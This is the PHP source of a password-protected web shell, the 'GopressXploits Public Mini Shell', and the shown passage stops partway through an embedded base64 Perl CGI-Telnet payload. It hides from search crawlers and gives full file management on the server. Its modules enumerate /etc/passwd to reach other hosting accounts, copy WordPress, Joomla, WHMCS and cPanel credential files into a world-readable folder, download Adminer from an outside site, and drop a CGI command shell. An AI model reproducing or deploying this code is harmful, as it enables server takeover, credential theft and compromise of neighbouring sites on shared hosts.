<?php
//NOCHANGE YA SAYANG :*
//Greetz Mr.CeRoS404 <= he Make this shell 
//and Me :'v
//Dont Change The Copyright Please :) 
//although only recode at least I've been trying to make this shell 
//dont Judge Please im newbie :) 
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$KeyMasuk = "ee1bc0688750cd9a96802766d3641b26";
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
     echo d3cryptR4ns0mw4r3::m3d1rs(d3cryptR4ns0mw4r3::locate(),"1",$_POST['pass']);
   break;
   case '2':
    echo d3cryptR4ns0mw4r3::m3d1rs(d3cryptR4ns0mw4r3::locate(),"2",$_POST['pass']);
   break;
}
}	
?>
<html>
<style type="text/css">
@import url(https://fonts.googleapis.com/css?family=Oxygen);
body {
background: b
	font-family: 'Oxygen';
    color: #e2e2e2;
}
.subimit{
    border-color: red;
    background-color: transparent;
    color: white;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: red;
}
</style>
<head>
<title>Gxp Shell </title>
<center>
<br><br><br><br><br><br>
<form method="post">
<br><br><br>
<font color="white">Password : </font> <input class="subimit" type="password" name="pass">
<br><br> <input type="submit" name="submit" class="submite" value="MASUK">
</form></center> 
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($KeyMasuk) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $KeyMasuk) ) )
	    $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['dl']) && ($_GET['dl'] != "")){
	$file = $_GET['dl'];
	$filez = @file_get_contents($file);
   header("Content-type: application/octet-stream"); 
   header("Content-length: ".strlen($filez)); 
   header("Content-disposition: attachment; filename=\"".basename($file)."\";");
   echo $filez; 
    exit; 
}


if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}

echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="https://fonts.googleapis.com/css?family=Ubuntu Mono" rel="stylesheet" type="text/css">

<title>GOPRESSXPLOITS</title>
<style>
body{
background-attachment:fixed;
-webkit-background-size: cover;
-moz-background-size: cover;
-o-background-size: cover;
background-size: cover;	
font-family: "Ubuntu Mono";
color: green;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: #636263;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: silver;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: green;
text-decoration: none;
}
a:hover{
color: green;
text-shadow:0px 0px 10px #FF00FF;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
echo "<br>";
echo "<br>";
echo "<center> GopressXploits Public Mini Shell V.1 </center>";
echo "<br>";
echo "System: ".php_uname()."<br>";
echo "<br>";
//INI MENU NYA DANCUK, JANGAN DI UBAH
echo "<a href='?'>[ HOME ]</a>";
echo "<a href='?path=$path&opt=jumping'> [ Jumping ]</a>";
echo "<a href='?path=$path&opt=config'> [ Config ]</a>";
echo "<a href='?path=$path&opt=adminer'> [ Adminer ]</a>";
echo "<a href='?path=$path&opt=mass_deface'> [ Mass ]</a>";
echo "<a href='?path=$path&opt=cgi'> [ Cgi T3ln3t ]</a>";
echo "<a href='?path=$path&opt=dos'> [ Domain ]</a><br>";
echo "<center>";
echo "<a style='color: red;' href='?logout=true'> [ Logout ]</a>";
echo "</center>";
echo "<br>";
echo "Current Path : ";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
echo "<br>";
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#FFB6C1">Succes</font><br />';
}else{
echo '<font color="#87CEFA">Error</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST"><font color="#FF1493">
Upload File<input type="file" name="file" />
<input type="submit" value="Uploads ! " />
</form>
</td></tr>';

if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#FFA500">Change Permission Done Yupz</font><br />';
}else{
echo '<font color="#DA70D6">Change Permission Error</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}
elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#DA70D6">Change Name Done Yupz</font><br />';
}else{
echo '<font color="#FFEFD5">Change Name Error</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}

elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#FFEFD5">Edit File Done Yupz</font><br />';
}else{
echo '<font color="#FFDEAD">Edit File Error</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';

if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#E0FFFF">Delete Dir Done Yupz</font><br />';
}else{
echo '<font color="#FAFAD2">Delete Dir Error</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="#FF69B4">Delete File Done Yupz</font><br />';
}else{
echo '<font color="#ADFF2F">Delete File Error</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="1300" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="#00BFFF">';
elseif(!is_readable("$path/$dir")) echo '<font color="#FFE4E1">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="#FF00FF">';
elseif(!is_readable("$path/$file")) echo '<font color="FFE4E1">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
[ <a href=\"?y=$path&amp;dl=$path/$file\">download</a> ]
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
if($_GET['opt'] == 'jumping') {
	$i = 0;
	$ip = gethostbyname($_SERVER['HTTP_HOST']);
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	}
	elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
} 
	elseif($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}
	elseif($_GET['opt'] == 'dos') {
	$all = array();
	// domain finder.
	$d0mains = file('/etc/named.conf');
	$domains = scandir("/var/named");

	if($domains or $d0mains){
	  $count = 0;
	  if($domains){
		echo "<center><h1>Count Domains on user</h1></center><br><br>";
		$cur = array();
		foreach($domains as $domain){
		  if(strpos($domain, '.db')){
			$dom = str_replace('.db', '', $domain);
			$own = posix_getpwuid(fileowner("/etc/valiases/$dom"));
			$user = $own['name'];
			$all[$user][] = $dom;
			//echo "$user: $dom<br/>";
		  }
		}
		echo "";
	  }
	  elseif($d0mains){

		$mck = array();
		foreach($d0mains as $domain){
		  preg_match_all('#zone "(.*)"#',$domain,$dom);
		  flush();
		  if(strlen(trim($domain[1][0])) >2){
			$mck[] = $dom[1][0];
		  }
		}
		
		$mck = array_unique($mck);
		foreach($mck as $dom){
		  $own = posix_getpwuid(fileowner("/etc/valiases/$dom"));
		  $user = $own['name'];
		  $all[$user][] = $dom;
		  //echo "$user: $dom<br/>";
		}
		echo "";
	  }
	}
foreach($all as $user => $domain){
  echo "<center>User <font color='red'>$user</font> has <font color='red'>".count($domain)."</font> Domains below :<br></center>";
  echo "<center>---------------<br>";
  foreach($domain as $v){
    echo "<center><a href='http://$v/' target='_blank'>http://$v<a><br></center>";
	}
  echo "<center>---------------";
  echo "<br><br>";

}
} elseif($_GET['opt'] == 'config') {
	$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
	$idx = mkdir("gxp_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("gxp_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_noname) {
				$user_config_dir = "/home/$user_noname/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_noname/.my.cnf" => "cpanel",
						"/home/$user_noname/.accesshash" => "WHM-accesshash",
						"/home/$user_noname/public_html/vdo_config.php" => "Voodoo",
						"/home/$user_noname/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$user_noname/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_noname/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_noname/public_html/clientarea/configuration.php" => "WHMCS",
						"/home/$user_noname/public_html/whm/configuration.php" => "WHMCS",
						"/home/$user_noname/public_html/whmcs/configuration.php" => "WHMCS",
						"/home/$user_noname/public_html/forum/config.php" => "phpBB",
						"/home/$user_noname/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_noname/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$user_noname/public_html/app/etc/local.xml" => "Magento",
						"/home/$user_noname/public_html/joomla/configuration.php" => "Joomla",
						"/home/$user_noname/public_html/configuration.php" => "Joomla",
						"/home/$user_noname/public_html/wp/wp-config.php" => "WordPress",
						"/home/$user_noname/public_html/wordpress/wp-config.php" => "WordPress",
						"/home/$user_noname/public_html/wp-config.php" => "WordPress",
						"/home/$user_noname/public_html/admin/config.php" => "OpenCart",
						"/home/$user_noname/public_html/slconfig.php" => "Sitelok",
						"/home/$user_noname/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("gxp_config/$user_noname-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='?dir=$path/gxp_config'><font color=blue>Done</font></a></center>";
}
elseif($_GET['opt'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' color=#FF1493 target='_blank'>MySQL Login</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' color=#FF1493 target='_blank'>MySQL Login</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}
elseif($_GET['opt'] == 'cgi') { 
echo "<center/><br/><b><font color=blue>+--==[ CGI T3ln3t ]==--+ </font></b><br><br>";
 mkdir('cgitelnet1', 0755);
    chdir('cgitelnet1');      
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb3B5cmlnaHQgYW5kIExpY2VuY2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIENHSS1UZWxuZXQgVmVyc2lvbiAxLjAgZm9yIE5UIGFuZCBVbml4IDogUnVuIENvbW1hbmRzIG9uIHlvdXIgV2ViIFNlcnZlcgojCiMgQ29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmEKIyBQZXJtaXNzaW9uIGlzIGdyYW50ZWQgdG8gdXNlLCBkaXN0cmlidXRlIGFuZCBtb2RpZnkgdGhpcyBzY3JpcHQgc28gbG9uZwojIGFzIHRoaXMgY29weXJpZ2h0IG5vdGljZSBpcyBsZWZ0IGludGFjdC4gSWYgeW91IG1ha2UgY2hhbmdlcyB0byB0aGUgc2NyaXB0CiMgcGxlYXNlIGRvY3VtZW50IHRoZW0gYW5kIGluZm9ybSBtZS4gSWYgeW91IHdvdWxkIGxpa2UgYW55IGNoYW5nZXMgdG8gYmUgbWFkZQojIGluIHRoaXMgc2NyaXB0LCB5b3UgY2FuIGUtbWFpbCBtZS4KIwojIEF1dGhvcjogUm9oaXRhYiBCYXRyYQojIEF1dGhvciBlLW1haWw6IHJvaGl0YWJAcm9oaXRhYi5jb20KIyBBdXRob3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vCiMgU2NyaXB0IEhvbWVwYWdlOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2NnaXNjcmlwdHMvY2dpdGVsbmV0Lmh0bWwKIyBQcm9kdWN0IFN1cHBvcnQ6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vc3VwcG9ydC8KIyBEaXNjdXNzaW9uIEZvcnVtOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2Rpc2N1c3MvCiMgTWFpbGluZyBMaXN0OiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL21saXN0LwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgSW5zdGFsbGF0aW9uCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUbyBpbnN0YWxsIHRoaXMgc2NyaXB0CiMKIyAxLiBNb2RpZnkgdGhlIGZpcnN0IGxpbmUgIiMhL3Vzci9iaW4vcGVybCIgdG8gcG9pbnQgdG8gdGhlIGNvcnJlY3QgcGF0aCBvbgojICAgIHlvdXIgc2VydmVyLiBGb3IgbW9zdCBzZXJ2ZXJzLCB5b3UgbWF5IG5vdCBuZWVkIHRvIG1vZGlmeSB0aGlzLgojIDIuIENoYW5nZSB0aGUgcGFzc3dvcmQgaW4gdGhlIENvbmZpZ3VyYXRpb24gc2VjdGlvbiBiZWxvdy4KIyAzLiBJZiB5b3UncmUgcnVubmluZyB0aGUgc2NyaXB0IHVuZGVyIFdpbmRvd3MgTlQsIHNldCAkV2luTlQgPSAxIGluIHRoZQojICAgIENvbmZpZ3VyYXRpb24gU2VjdGlvbiBiZWxvdy4KIyA0LiBVcGxvYWQgdGhlIHNjcmlwdCB0byBhIGRpcmVjdG9yeSBvbiB5b3VyIHNlcnZlciB3aGljaCBoYXMgcGVybWlzc2lvbnMgdG8KIyAgICBleGVjdXRlIENHSSBzY3JpcHRzLiBUaGlzIGlzIHVzdWFsbHkgY2dpLWJpbi4gTWFrZSBzdXJlIHRoYXQgeW91IHVwbG9hZAojICAgIHRoZSBzY3JpcHQgaW4gQVNDSUkgbW9kZS4KIyA1LiBDaGFuZ2UgdGhlIHBlcm1pc3Npb24gKENITU9EKSBvZiB0aGUgc2NyaXB0IHRvIDc1NS4KIyA2LiBPcGVuIHRoZSBzY3JpcHQgaW4geW91ciB3ZWIgYnJvd3Nlci4gSWYgeW91IHVwbG9hZGVkIHRoZSBzY3JpcHQgaW4KIyAgICBjZ2ktYmluLCB0aGlzIHNob3VsZCBiZSBodHRwOi8vd3d3LnlvdXJzZXJ2ZXIuY29tL2NnaS1iaW4vY2dpdGVsbmV0LnBsCiMgNy4gTG9naW4gdXNpbmcgdGhlIHBhc3N3b3JkIHRoYXQgeW91IHNwZWNpZmllZCBpbiBTdGVwIDIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyCiMgdmFsdWVzIHNob3VsZCB3b3JrIGZpbmUgZm9yIG1vc3Qgc3lzdGVtcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQokUGFzc3dvcmQgPSAiMTIzNDU2IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4KCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZgoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQKCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQoJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0CgkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2